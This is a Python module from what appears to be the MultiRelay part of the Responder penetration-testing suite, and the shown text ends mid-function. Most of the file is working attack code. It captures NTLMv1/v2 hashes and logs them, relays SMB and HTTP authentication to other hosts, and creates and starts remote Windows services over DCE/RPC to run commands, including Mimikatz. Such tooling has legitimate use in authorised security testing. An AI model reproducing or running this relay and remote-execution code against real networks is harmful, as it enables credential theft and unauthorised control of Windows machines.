#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import struct
import sys
import random
import time
import os
import binascii
import re
import datetime
import threading
import uuid
from MultiRelay.RelayMultiPackets import *
from odict import OrderedDict
from base64 import b64decode, b64encode
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), 'creddump')))
from framework.win32.hashdump import dump_file_hashes
from SMBFinger.Finger import ShowSmallResults
from socket import *

SaveSam_Path = os.path.abspath(os.path.join(os.path.dirname(__file__)))+"/relay-dumps/"
Logs_Path = os.path.abspath(os.path.join(os.path.dirname(__file__)))+"/../../"

READTIMEOUT = 1
READ = "\xc0\x00"
RW   = "\xc2\x00"
MimiKatzSVCName  = ""
MimiKatzSVCID  = ""

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))

# Function used to write captured hashs to a file.
def WriteData(outfile, data, user):
        if not os.path.isfile(outfile):
                with open(outfile,"w") as outf:
                        outf.write(data + '\n')
                return
        with open(outfile,"r") as filestr:
                if re.search(user.encode('hex'), filestr.read().encode('hex')):
                        return False
                elif re.search(re.escape("$"), user):
                        return False
        with open(outfile,"a") as outf2:
                outf2.write(data + '\n')

#Function used to verify if a previous auth attempt was made.
def ReadData(Outfile, Client, User, Domain, Target, cmd):
    try:
        with open(Logs_Path+"logs/"+Outfile,"r") as filestr:
            Login = Client+":"+User+":"+Domain+":"+Target+":Logon Failure"
            if re.search(Login.encode('hex'), filestr.read().encode('hex')):
                print ("[+] User %s\\%s previous login attempt returned logon_failure. Not forwarding anymore to prevent account lockout\n"%(Domain,User))
                return True

            else:
                return False
    except:
        raise

def ServeOPTIONS(data):
        WebDav= re.search('OPTIONS', data)
        if WebDav:
                Buffer = WEBDAV_Options_Answer()
                return str(Buffer)

        return False

def IsSMBAnonymous(data):
    SSPIStart  = data.find('NTLMSSP')
    SSPIString = data[SSPIStart:]
    Username = struct.unpack('<H',SSPIString[38:40])[0]
    if Username == 0:
       return True
    else:
       return False

def ParseHTTPHash(data, key, client, UserToRelay, Host, Pivoting):
        LMhashLen    = struct.unpack('<H',data[12:14])[0]
        LMhashOffset = struct.unpack('<H',data[16:18])[0]
        LMHash       = data[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()

        NthashLen    = struct.unpack('<H',data[20:22])[0]
        NthashOffset = struct.unpack('<H',data[24:26])[0]
        NTHash       = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()

        UserLen      = struct.unpack('<H',data[36:38])[0]
        UserOffset   = struct.unpack('<H',data[40:42])[0]
        User         = data[UserOffset:UserOffset+UserLen].replace('\x00','')

        if NthashLen == 24:
                HostNameLen     = struct.unpack('<H',data[46:48])[0]
                HostNameOffset  = struct.unpack('<H',data[48:50])[0]
                HostName        = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
                WriteHash       = '%s::%s:%s:%s:%s' % (User, HostName, LMHash, NTHash, key.encode("hex"))
                WriteData(Logs_Path+"logs/SMB-Relay-"+client+".txt", WriteHash, User)
                if client == Host:
                   if Pivoting[0] == "1":
                      pass
                   else:
                      print ("[+] Attempting reflective NTLM Relay, this is likely to fail." )
                else:
                   if Pivoting[0] == "1":
                      pass
                   else:
                      print ("[+] Received NTLMv1 hash from: %s %s"%(client, ShowSmallResults((client,445))))

                if ('!' + User) in UserToRelay:
                    print ("[+] Username: %s is blacklisted, dropping connection." % User)
                    return None, None
                elif User in UserToRelay or "ALL" in UserToRelay:
                        if Pivoting[0] == "1":
                           return User, Domain
                        print ("[+] Username: %s is whitelisted, forwarding credentials."%(User))
                        if ReadData("SMBRelay-Session.txt", client, User, HostName, Host, cmd=None):
                           ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
                           return None, None
                        else:
                           return User, HostName
                else:
                        print ("[+] Username: %s not in target list, dropping connection."%(User))
                        return None, None

        if NthashLen > 24:
                DomainLen      = struct.unpack('<H',data[28:30])[0]
                DomainOffset   = struct.unpack('<H',data[32:34])[0]
                Domain         = data[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
                HostNameLen    = struct.unpack('<H',data[44:46])[0]
                HostNameOffset = struct.unpack('<H',data[48:50])[0]
                HostName       = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
                WriteHash      = '%s::%s:%s:%s:%s' % (User, Domain, key.encode("hex"), NTHash[:32], NTHash[32:])
                WriteData(Logs_Path+"logs/SMB-Relay-"+client+".txt", WriteHash, User)
                if client == Host:
                   if Pivoting[0] == "1":
                      pass
                   else:
                      print ("[+] Attempting reflective NTLM Relay, this is likely to fail.")
                else:
                   if Pivoting[0] == "1":
                      pass
                   else:
                      print ("[+] Received NTLMv2 hash from: %s %s"%(client, ShowSmallResults((client,445))))
                if User in UserToRelay or "ALL" in UserToRelay:
                        if Pivoting[0] == "1":
                           return User, Domain

                        print ("[+] Username: %s is whitelisted, forwarding credentials."%(User))

                        if ReadData("SMBRelay-Session.txt", client, User, Domain, Host, cmd=None):
                           ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
                           return None, None
                        else:
                           return User, Domain
                else:
                        print ("[+] Username: %s not in target list, dropping connection."%(User))
                        return None, None


def ParseSMBHash(data,client, challenge,UserToRelay,Host,Pivoting):  #Parse SMB NTLMSSP v1/v2
        SSPIStart  = data.find('NTLMSSP')
        SSPIString = data[SSPIStart:]
        LMhashLen    = struct.unpack('<H',data[SSPIStart+14:SSPIStart+16])[0]
        LMhashOffset = struct.unpack('<H',data[SSPIStart+16:SSPIStart+18])[0]
        LMHash       = SSPIString[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
        NthashLen    = struct.unpack('<H',data[SSPIStart+20:SSPIStart+22])[0]
        NthashOffset = struct.unpack('<H',data[SSPIStart+24:SSPIStart+26])[0]

        if NthashLen == 24:
                SMBHash      = SSPIString[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
                DomainLen    = struct.unpack('<H',SSPIString[30:32])[0]
                DomainOffset = struct.unpack('<H',SSPIString[32:34])[0]
                Domain       = SSPIString[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
                UserLen      = struct.unpack('<H',SSPIString[38:40])[0]
                UserOffset   = struct.unpack('<H',SSPIString[40:42])[0]
                Username     = SSPIString[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
                WriteHash    = '%s::%s:%s:%s:%s' % (Username, Domain, LMHash, SMBHash, challenge.encode("hex"))
                WriteData(Logs_Path+"logs/SMB-Relay-SMB-"+client+".txt", WriteHash, Username)
                if client == Host:
                   if Pivoting[0] == "1":
                      pass
                   else:
                      print ("[+] Attempting reflective NTLM Relay, this is likely to fail.")
                else:
                   if Pivoting[0] == "1":
                      pass
                   else:
                      print ("[+] Received NTLMv1 hash from: %s %s"%(client, ShowSmallResults((client,445))))
                if Username in UserToRelay or "ALL" in UserToRelay:
                        if Pivoting[0] == "1":
                           return Username, Domain

                        print ("[+] Username: %s is whitelisted, forwarding credentials."%(Username))
                        if ReadData("SMBRelay-Session.txt", client, Username, Domain, Host, cmd=None):
                           ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
                           return None, None
                        else:
                           return Username, Domain
                else:
                        print ("[+] Username: %s not in target list, dropping connection."%(Username))
                        return None, None

        if NthashLen > 60:
                SMBHash      = SSPIString[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
                DomainLen    = struct.unpack('<H',SSPIString[30:32])[0]
                DomainOffset = struct.unpack('<H',SSPIString[32:34])[0]
                Domain       = SSPIString[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
                UserLen      = struct.unpack('<H',SSPIString[38:40])[0]
                UserOffset   = struct.unpack('<H',SSPIString[40:42])[0]
                Username     = SSPIString[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
                WriteHash    = '%s::%s:%s:%s:%s' % (Username, Domain, challenge.encode("hex"), SMBHash[:32], SMBHash[32:])
                WriteData(Logs_Path+"logs/SMB-Relay-SMB-"+client+".txt", WriteHash, Username)
                if client == Host:
                   if Pivoting[0] == "1":
                      pass
                   else:
                      print ("[+] Attempting reflective NTLM Relay, this is likely to fail.")
                else:
                   if Pivoting[0] == "1":
                      pass
                   else:
                      print ("[+] Received NTLMv2 hash from: %s %s"%(client, ShowSmallResults((client,445))))
                if Username in UserToRelay or "ALL" in UserToRelay:
                        if Pivoting[0] == "1":
                           return Username, Domain
                        print ("[+] Username: %s is whitelisted, forwarding credentials."%(Username))
                        if ReadData("SMBRelay-Session.txt", client, Username, Domain, Host, cmd=None):
                           ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
                           return None, None
                        else:
                           return Username, Domain
                else:
                        print ("[+] Username: %s not in target list, dropping connection."%(Username))
                        return None, None

#Get the index of the dialect we want. That is NT LM 0.12.
def Parse_Nego_Dialect(data):
        Dialect = tuple([e.replace('\x00','') for e in data[40:].split('\x02')[:10]])
        for i in range(0, 16):
                if Dialect[i] == 'NT LM 0.12':
                        return chr(i) + '\x00'

def ExtractSMBChallenge(data, Pivoting):
    SSPIStart  = data.find('NTLMSSP')
    SSPIString = data[SSPIStart:]
    Challenge  = SSPIString[24:32]
    if Pivoting[0] == "1":
       return Challenge
    else:
       print ("[+] Setting up SMB relay with SMB challenge:", Challenge.encode("hex"))
       return Challenge

def ExtractHTTPChallenge(data,Pivoting):
    SecBlobLen = struct.unpack("<h", data[43:45])[0]
    if SecBlobLen <= 257:
       Challenge = data[102:110]
    if SecBlobLen >= 258:
       Challenge = data[106:114]
    if Pivoting[0] == "1":
       return Challenge
    else:
       print ("[+] Setting up HTTP relay with SMB challenge:", Challenge.encode("hex"))
       return Challenge

#Here we extract the complete NTLM message from an HTTP request and we will later feed it to our SMB target.
def ExtractRawNTLMPacket(data):
    SecBlobLen = struct.unpack("<h", data[43:45])[0]
    SSP = re.search("NTLMSSP", data[47:]).start()
    RawNTLM = data[47+SSP:47+SecBlobLen]
    return RawNTLM

#Is this a Guest sessions?
def GetSessionResponseFlags(data):
    if data[41:43] == "\x01\x00":
       print ("[+] Server returned session positive, but as guest. Psexec should fail even if authentication was successful..")

#Keeps our connection alive.
def SMBKeepAlive(s, data):
    head = SMBHeader(cmd="\x2b",flag1="\x18", flag2="\x07\xc8",mid="\x04\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
    t = SMBEcho()
    packet1 = str(head)+str(t)
    buffer1 = longueur(packet1)+packet1  
    s.send(buffer1)
    data = s.recv(2048)
    time.sleep(1)


#Used for SMB read operations. We grab everything past the Byte Count len in the packet.
def ExtractCommandOutput(data):
    DataLen = struct.unpack("<H", data[61:63])[0]
    Output = data[63:63+DataLen]
    return Output

#Used for SMB/DCE-RPC read operations. We grab everything past the Byte Count len in the packet.
def ExtractRPCCommandOutput(data):
    DataLen = struct.unpack("<H", data[61:63])[0]
    if data[64:66] == "\x05\x00":
       Output = data[88:88+DataLen]
    else:
       Output = data[64:64+DataLen]
    return Output

#from:http://stackoverflow.com/questions/5194057/better-way-to-convert-file-sizes-in-python
def GetReadableSize(size,precision=2):
    suffixes=['B','KB','MB','GB','TB']
    suffixIndex = 0
    while size > 1024 and suffixIndex < 4:
        suffixIndex += 1
        size = size/1024.0
    return "%.*f%s"%(precision,size,suffixes[suffixIndex])

def WriteOutputToFile(data, File):
    with open(SaveSam_Path+"/"+File, "wb") as file:
        file.write(data)

def FindLocalIp():
    s = socket(AF_INET, SOCK_DGRAM)
    try:
        s.connect(("1.1.1.1", 0))
        IP = s.getsockname()[0]
        s.close()
    except:
        print ("It seems like you're not connected to any network..")
        IP = '127.0.0.1'
        s.close()
    return IP

def longueur(payload):
    length = struct.pack(">i", len(''.join(payload)))
    return length

def ConvertToClassC(Host, Class):
    Class = Class.strip()
    Ip = re.split(r'(\.|/)', Host)
    if Class == "/24":
       Ip[6:7] = ["0"]
       return ''.join(Ip)+Class
    if Class == "/16":
       Ip[4:5] = ["0"]
       Ip[6:7] = ["0"]
       return ''.join(Ip)+Class
    else:
       print ("Illegal class, please use: /24 or /16")
       return None

def GenerateRandomFileName():
    return ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(random.randint(5, 15))])

def GenerateServiceName():
    return ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(11)])

def GenerateServiceID():
    return''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(16)])

def GenerateNamedPipeName():
    return''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for i in range(random.randint(3, 30))])

def Generateuuid():
    RandomStr     = binascii.b2a_hex(os.urandom(16))
    x             = uuid.UUID(bytes_le=RandomStr.decode('hex'))
    DisplayGUID   = uuid.UUID(RandomStr)
    DisplayGUIDle = x.bytes
    return str(DisplayGUID), str(DisplayGUIDle)

###
#SMBRelay grab
###

def GrabNegotiateFromTarget(data, s, Pivoting):
      ## Start with nego protocol + session setup negotiate to our target.
      h = SMBHeader(cmd="\x72",flag1="\x18", flag2="\x07\xc8")
      n = SMBNegoCairo(Data = SMBNegoCairoData())
      n.calculate()
      packet0 = str(h)+str(n)
      buffer0 = longueur(packet0)+packet0
      s.send(buffer0)
      smbdata = s.recv(4096)
      ##Session Setup AndX Request, NTLMSSP_NEGOTIATE to our target.
      if smbdata[8:10] == "\x72\x00":
         head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x07\xc8",mid="\x02\x00")
         t = data[36:] #simply grab the whole packet except the smb header from the client.
         packet1 = str(head)+str(t)
         buffer1 = longueur(packet1)+packet1  
         s.send(buffer1)
         smbdata = s.recv(4096)   
         challenge = ExtractSMBChallenge(smbdata, Pivoting)#Grab the challenge, in case we want to crack the hash later.
         return data, smbdata, s, challenge

def SendChallengeToClient(data, smbdata, conn):
     ##Relay all that to our client.
     if data[8:10] == "\x73\x00":
         head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x53\xc8", errorcode="\x16\x00\x00\xc0", pid=pidcalc(data),mid=midcalc(data))
         t = smbdata[36:]#simply grab the whole packet except the smb header from the client.
         packet0 = str(head)+str(t)
         buffer0 = longueur(packet0)+packet0
         conn.send(buffer0)
         data = conn.recv(4096)
         return data, conn

##This function is one of the main SMB read function. We request all the time 65520 bytes to the server. 
#Add (+32 (SMBHeader) +4 Netbios Session Header + 27 for the ReadAndx structure) +63 and you end up with 65583.
#set the socket to non-blocking then grab all data, if our target has less than 65520 (last packet) grab the incoming
#data until we reach our custom timeout. Set back the socket to blocking and return the data.
def SMBReadRecv(s):
    Completedata=[]
    data=''
    Start=time.time()
    s.setblocking(0)
    while 1:
        if len(''.join(Completedata)) == 65583:
            break
        if Completedata and time.time()-Start > READTIMEOUT:#Read timeout
            break
        try:
            data = s.recv(65583)
            if data:
                Completedata.append(data)
                Start=time.time()
            else:
                break
        except:
            pass

    s.setblocking(1)
    return s, ''.join(Completedata)

##We send our ReadAndX request with our offset and call SMBReadRecv 
def ReadOutput(DataOffset, f, data, s):
     head = SMBHeader(cmd="\x2e",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x12\x00")
     t = ReadRequestAndX(FID=f, Offset = DataOffset)
     packet1 = str(head)+str(t)
     buffer1 = longueur(packet1)+packet1  
     s.send(buffer1)
     s, data = SMBReadRecv(s)
     return data, s, ExtractCommandOutput(data)

##We send our WriteAndX request with our offset. 
def WriteOutput(DataOffset, Chunk, data, f, s):
     head = SMBHeader(cmd="\x2f", flag1="\x18", flag2="\x07\xc8", uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x12\x00")
     t = SMBWriteData(FID=f, Offset = DataOffset, Data= Chunk)
     t.calculate()
     packet1 = str(head)+str(t)
     buffer1 = longueur(packet1)+packet1
     s.send(buffer1)
     data = s.recv(2048)
     ##LockingAndX //should not happens since we didn't request an oplock, but just in case..
     if data[8:10] == "\x24\x00":
        head = SMBHeader(cmd="\x24", flag1="\x88", flag2="\x07\xc8", uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x12\x00")
        t = SMBLockingAndXResponse()
        packet1 = str(head)+str(t)
        buffer1 = longueur(packet1)+packet1
        s.send(buffer1)
     return data, s

##When used this function will inject an OpenAndX file not found SMB Header into an incoming packet. 
##This is usefull for us when an operation fail. We land back to our shell send right away a
##Tree Connect IPC$ and start to send SMB echos so we don't loose this precious connection.
def ModifySMBRetCode(data):
     modified = list(data)
     modified[8:10] = "\x2d\x34"
     return ''.join(modified)

##We send our ReadAndX request with our offset and call recv()
def SMBDCERPCReadOutput(DataOffset, length,f, data, s):
     head = SMBHeader(cmd="\x2e",uid=data[32:34],tid=data[28:30],pid=data[30:32],mid="\x12\x00")
     t = SMBDCERPCReadRequestAndX(FID=f, MaxCountLow=length, MinCount=length,Offset = DataOffset)
     packet1 = str(head)+str(t)
     buffer1 = longueur(packet1)+packet1  
     s.send(buffer1)
     data = s.recv(8092)
     return data, s, ExtractRPCCommandOutput(data)

###
#BindCall
###

def BindCall(UID, Version, File, data, s):
    Data = data
    head = SMBHeader(cmd="\xa2",flag1="\x18", flag2="\x02\x28",mid="\x05\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
    t = SMBNTCreateDataSVCCTL(FileName=File)
    t.calculate()
    packet0 = str(head)+str(t)
    buffer1 = longueur(packet0)+packet0
    s.send(buffer1)
    data = s.recv(2048)

    ## Fail Handling.
    if data[8:10] == "\xa2\x22":
        print ("[+] NT_CREATE denied. SMB Signing mandatory or this user has no privileges on this workstation.\n")
        return ModifySMBRetCode(data)

    ## Fail Handling.
    if data[8:10]== "\xa2\xac":##Pipe is sleeping.
        f = "PipeNotAvailable"
        return Data, s, f

    ## Fail Handling.
    if data[8:10]== "\xa2\x34":##Pipe is not enabled.
        f = "ServiceNotFound"
        return Data, s, f

    ## DCE/RPC Write.
    if data[8:10] == "\xa2\x00":
        head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x06\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        x = SMBDCEData(CTX0UID=UID, CTX0UIDVersion=Version)
        x.calculate()
        f = data[42:44]
        t = SMBDCERPCWriteData(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)

    ## DCE/RPC Read.
    if data[8:10] == "\x2f\x00":
            head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x07\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
            t = SMBReadData(FID=f,MaxCountLow="\x00\x04", MinCount="\x00\x04",Offset="\x00\x00\x00\x00")
            t.calculate()
            packet0 = str(head)+str(t)
            buffer1 = longueur(packet0)+packet0
            s.send(buffer1)
            data = s.recv(2048)
            return data, s, f

###########################
#Launch A Mimikatz CMD
###########################
def MimiKatzRPC(Command, f, host, data, s):
       ## DCE/RPC MimiKatzRPC.
       ## DCE/RPC Write.
       if data[8:10] == "\x2e\x00":
            head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x06\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
            w = SMBDCEMimiKatzRPCCommand(CMD=Command)
            w.calculate()
            x = SMBDCEPacketData(Data=w, Opnum="\x03\x00")
            x.calculate()
            t = SMBDCERPCWriteData(FID=f,Data=x)
            t.calculate()
            packet0 = str(head)+str(t)
            buffer1 = longueur(packet0)+packet0
            s.send(buffer1)
            data = s.recv(2048)

       ## DCE/RPC Read.
       if data[8:10] == "\x2f\x00":
            head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x07\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
            t = SMBReadData(FID=f,MaxCountLow=struct.pack('<h', 1024), MinCount=struct.pack('<h', 1024), Offset="\x00\x00\x00\x00")
            t.calculate()
            packet0 = str(head)+str(t)
            buffer1 = longueur(packet0)+packet0
            s.send(buffer1)
            data = s.recv(2048)

       ##ReadRequest.
       ##Used when output =< 1024, therefore only one read.
       if data[8:10] == "\x2e\x00":
          #First Packet from output contains the complete len of what's coming, don't print it.
          LenOut = len(ExtractRPCCommandOutput(data))
          Output = ExtractRPCCommandOutput(data)[12:LenOut-9]
          print (Output)
          return data,s,f

       ##Do large RPC reads..
       if data[8:10] == "\x2e\x05":
          buffsize = 1024
          filesize = struct.unpack('<i', data[96:100])[0]*2
          print ('File size: %s'%(GetReadableSize(filesize)))
          dataoffset = 0
          start_time = time.time()
          ##First Packet from output contains the complete len of what's coming, don't print it.
          Output = ExtractRPCCommandOutput(data)[12:]
          while True:
              dataoffset = dataoffset + buffsize
              if data[64:66] == "\x05\x00" and data[67] == "\x02":##Last DCE/RPC Frag
                 LastFragLen = struct.unpack('<h', data[61:63])[0]
                 if LastFragLen < 1024:
                    Output += ExtractRPCCommandOutput(data)
                    break
                 else:
                    data, s, out = SMBDCERPCReadOutput(struct.pack("<i", dataoffset), struct.pack('<h', 4096),f, data, s)
                    Output += ExtractRPCCommandOutput(data)
                    break

              if data[64:66] == "\x05\x00" and data[67] == "\x03":##First and Last DCE/RPCFrag
                 data, s, out = SMBDCERPCReadOutput(struct.pack("<i", dataoffset), struct.pack('<h', 4096),f, data, s)
                 Output += ExtractRPCCommandOutput(data)
                 break
                  
              else:
                 data, s, out = SMBDCERPCReadOutput(struct.pack("<i", dataoffset), struct.pack('<h', buffsize),f, data, s)
                 Output += ExtractRPCCommandOutput(data)
          Seconds = (time.time() - start_time)
          if Seconds>60:
              minutes = Seconds/60
              print ('Fetched in: %.3g minutes.'%(minutes))
          if Seconds<60:
              print ('Fetched in: %.3g seconds'%(Seconds))
          print ("Output:\n", Output)
          return data,s,f

######################################
#Launch And Create a MimiKatz Service
######################################
def CreateMimikatzService(Command, ServiceNameChars, ServiceIDChars, f, host, data, s):
    ## DCE/RPC SVCCTLOpenManagerW.
    if data[8:10] == "\x2e\x00":
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x08\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLOpenManagerW(MachineNameRefID="\x00\x00\x02\x00", MachineName=host)
        w.calculate()
        x = SMBDCEPacketData(Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)
    ##Error handling.
    if data[8:10] == "\x2e\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to open SVCCTL Service Manager, is that user a local admin on this host?\n")
            return ModifySMBRetCode(data)

    ## DCE/RPC Create Service.
    if data[8:10] == "\x25\x00":
        ContextHandler = data[84:104]
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x09\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLCreateService(ContextHandle=ContextHandler,ServiceName=ServiceNameChars,DisplayNameID=ServiceIDChars,BinCMD=Command)
        w.calculate()
        x = SMBDCEPacketData(Opnum="\x0c\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)
        #print ("[+] Creating service")

    ## DCE/RPC SVCCTLOpenService.
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to create the service\n")
            return ModifySMBRetCode(data)
        ContextHandlerService = data[88:108]
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0a\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLOpenService(ContextHandle=ContextHandler,ServiceName=ServiceNameChars)
        w.calculate()
        x = SMBDCEPacketData(Opnum="\x10\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)

        ## DCE/RPC SVCCTLStartService.
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to open the service.\n")
            return ModifySMBRetCode(data)
        ContextHandler = data[84:104]
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLStartService(ContextHandle=ContextHandler)
        x = SMBDCEPacketData(Opnum="\x13\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)

    ## DCE/RPC SVCCTLQueryService.
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to start the service.\n")
            return ModifySMBRetCode(data)
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLQueryService(ContextHandle=ContextHandlerService)
        x = SMBDCEPacketData(Opnum="\x06\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)
        s.send(buffer1)
        data = s.recv(2048)
        s.send(buffer1)
        data = s.recv(2048)

    ## DCE/RPC SVCCTLCloseService
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to query the service.\n")
            return ModifySMBRetCode(data)
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLCloseService(ContextHandle=ContextHandlerService)
        x = SMBDCEPacketData(Opnum="\x00\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)
        return data, s, f 

###########################
#Stop And Delete A Service
###########################
def StopAndDeleteService(Command, ServiceNameChars, ServiceIDChars, f, host, data, s):
    ## DCE/RPC SVCCTLOpenManagerW.
    if data[8:10] == "\x2e\x00":
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x08\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLOpenManagerW(MachineNameRefID="\x00\x00\x02\x00", MachineName=host)
        w.calculate()
        x = SMBDCEPacketData(Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)
    ##Error handling.
    if data[8:10] == "\x2e\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to open SVCCTL Service Manager, is that user a local admin on this host?\n")
            return ModifySMBRetCode(data)

    ## DCE/RPC SVCCTLOpenService.
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to create the service\n")
            return ModifySMBRetCode(data)
        ContextHandlerService = data[84:104]
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0a\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLOpenService(ContextHandle=ContextHandlerService,ServiceName=ServiceNameChars)
        w.calculate()
        x = SMBDCEPacketData(Opnum="\x10\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)

    ## DCE/RPC SVCCTLControlService, stop operation.
    if data[8:10] == "\x25\x00":
        if data[len(data)-4:] == "\x05\x00\x00\x00":
            print ("[+] Failed to open the service.\n")
            return ModifySMBRetCode(data)
        ContextHandlerService = data[84:104]
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCESVCCTLControlService(ContextHandle=ContextHandlerService, ControlOperation="\x01\x00\x00\x00")
        x = SMBDCEPacketData(Opnum="\x01\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)

    ## DCE/RPC SVCCTLDeleteService.
    if data[8:10] == "\x25\x00":
